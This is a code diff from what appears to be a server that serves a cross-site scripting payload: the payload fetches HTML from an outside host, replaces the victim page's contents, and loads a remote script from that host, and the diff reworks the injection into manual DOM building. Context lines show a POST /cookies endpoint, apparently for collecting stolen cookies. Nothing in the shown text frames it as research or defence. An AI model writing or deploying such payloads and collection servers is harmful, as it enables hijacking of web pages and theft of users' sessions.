@@ -39,20 +39,33 @@ fetch('https://data.estebanmf.space/xss')
 .then(t => t.text())
 .then(d => {
 console.log('Fetched HTML:', d);
-// Construct full HTML document
-document.documentElement.innerHTML = \`
-<!DOCTYPE html>
-<html>
-<head>
-<title>XSS</title>
-</head>
-<body>
-\${d}
-<script src="https://data.estebanmf.space/xss-script.js"></script>
-</body>
-</html>
-\`;
-console.log('HTML and script injected');
+// Clear existing document
+while (document.documentElement.firstChild) {
+document.documentElement.removeChild(document.documentElement.firstChild);
+}
+// Create <html> structure
+const html = document.createElement('html');
+const head = document.createElement('head');
+const title = document.createElement('title');
+title.textContent = 'XSS';
+head.appendChild(title);
+// Parse fetched body content into a temporary container
+const tempDiv = document.createElement('div');
+tempDiv.innerHTML = d; // Temporary use of innerHTML to parse
+const body = tempDiv.querySelector('body') || document.createElement('body');
+// Move body children to new body element
+while (tempDiv.firstChild) {
+body.appendChild(tempDiv.firstChild);
+}
+// Create script tag for xss-script.js
+const script = document.createElement('script');
+script.src = 'https://data.estebanmf.space/xss-script.js';
+body.appendChild(script);
+// Assemble document
+html.appendChild(head);
+html.appendChild(body);
+document.appendChild(html);
+console.log('DOM manually constructed and script appended');
 })
 .catch(e => console.error('Fetch error:', e));
 `;
@@ -63,7 +76,6 @@ console.log('HTML and script injected');
         },
       });
     }
-
 
     // POST /cookies
     if (url.pathname === "/cookies" && req.method === "POST") {
